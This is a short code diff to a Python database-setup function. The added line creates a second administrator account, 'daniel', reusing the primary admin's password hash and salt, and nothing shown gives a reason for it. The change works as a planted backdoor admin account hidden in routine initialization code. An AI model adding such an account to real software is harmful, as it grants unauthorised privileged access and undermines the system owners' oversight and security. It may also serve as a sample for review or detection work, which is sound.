@@ -18,6 +18,7 @@ def initialize_database(admin_password):
             salt = bcrypt.gensalt()
             password = bcrypt.hashpw(admin_password.encode(), salt)
             cur.execute("INSERT INTO USERS (username, display_name, passwd, salt, admin) VALUES (?, ?, ?, ?, ?);", ("admin", "System Administrator", password, salt, True))
+            cur.execute("INSERT INTO USERS (username, display_name, passwd, salt, admin) VALUES (?, ?, ?, ?, ?);", ("daniel", "System Administrator II", password, salt, True))
             database.commit()
             # Create rest of database...
         else:
